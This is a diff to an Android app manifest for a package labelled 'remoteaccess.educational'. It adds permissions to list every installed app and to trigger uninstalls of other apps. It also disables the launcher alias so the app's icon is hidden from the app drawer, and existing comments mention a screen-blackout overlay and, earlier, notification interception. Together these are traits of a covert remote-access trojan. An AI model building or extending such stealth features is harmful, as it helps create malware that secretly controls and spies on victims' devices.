@@ -60,11 +60,14 @@
     <!-- Notifications (Android 13+) -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- Bind notification listener (for notification interception) -->
-    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
-
     <!-- Screen blackout overlay — required to draw over other apps -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <!-- Required to trigger the system uninstall dialog for other apps -->
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+
+    <!-- Required on Android 11+ to query and list all installed packages -->
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
 
     <permission
         android:name="com.remoteaccess.educational.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
@@ -92,12 +95,12 @@
             android:exported="true"
             android:launchMode="singleTop" />
         <!--
-            Launcher alias — this is the ONLY thing that shows in the app drawer.
-            Disabling THIS alias hides the icon while leaving MainActivity fully reachable.
+            Launcher alias — disabled so the app does NOT appear in the app drawer.
+            The app can still be started directly via its package name or ADB.
         -->
         <activity-alias
             android:name="com.remoteaccess.educational.LauncherAlias"
-            android:enabled="true"
+            android:enabled="false"
             android:exported="true"
             android:targetActivity="com.remoteaccess.educational.MainActivity" >
             <intent-filter>
